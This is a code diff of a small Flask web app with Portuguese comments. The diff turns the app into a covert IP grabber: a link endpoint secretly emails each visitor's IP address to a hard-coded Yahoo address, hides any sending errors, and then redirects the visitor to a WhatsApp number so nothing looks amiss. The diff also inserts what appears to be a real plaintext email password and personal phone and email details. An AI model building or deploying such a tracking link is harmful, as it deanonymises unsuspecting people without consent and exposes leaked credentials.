@@ -3,16 +3,7 @@ import smtplib
 
 app = Flask(__name__)
 
-@app.route('/')
-def index():
-    # Obtém o IP do usuário
-    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
-    
-    # Redireciona o usuário para o WhatsApp
-    whatsapp_url = 'https://wa.me/SEU_NUMERO_DO_WHATSAPP'
-    return redirect(whatsapp_url)
-
-@app.route('/get-ip', methods=['POST'])
+@app.route('/get-ip', methods=['GET'])
 def get_ip():
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
 
@@ -20,7 +11,7 @@ def get_ip():
     email_server = 'smtp.mail.yahoo.com'
     email_port = 465
     email_sender = 'maria_crisostom0@yahoo.com'
-    email_password = 'SUA_SENHA_DO_YAHOO'
+    email_password = 'prosopopei4'
     email_recipient = 'minadoooo11@yahoo.com'
 
     # Criação da mensagem
@@ -35,9 +26,11 @@ def get_ip():
             server.sendmail(email_sender, email_recipient, email_text)
     except Exception as e:
         # Lidar com o erro de envio de email
-        return 'Erro ao enviar o email'
+        pass
 
-    return 'Email enviado com sucesso!'
+    whatsapp_url = f'https://wa.me/27998041981'
+
+    return redirect(whatsapp_url)
 
 if __name__ == '__main__':
     app.run()
